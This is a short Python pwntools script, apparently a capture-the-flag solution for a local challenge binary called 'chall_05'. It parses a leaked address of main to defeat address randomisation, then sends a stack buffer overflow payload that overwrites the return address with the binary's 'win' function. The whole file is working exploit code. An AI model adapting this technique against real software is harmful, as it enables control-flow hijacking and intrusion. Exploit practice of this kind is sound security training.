from pwn import *
import re
binary = context.binary = ELF('./chall_05')
p = process(binary.path)
resp = p.recv()
main_addr_leak = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
binary.address = main_addr_leak - binary.sym.main
log.info('binary.address: ' + hex(binary.address)) #prints

payload = b'A' * (0x60 - 0x8) + p64(binary.sym.win)
p.sendline(payload)
p.interactive()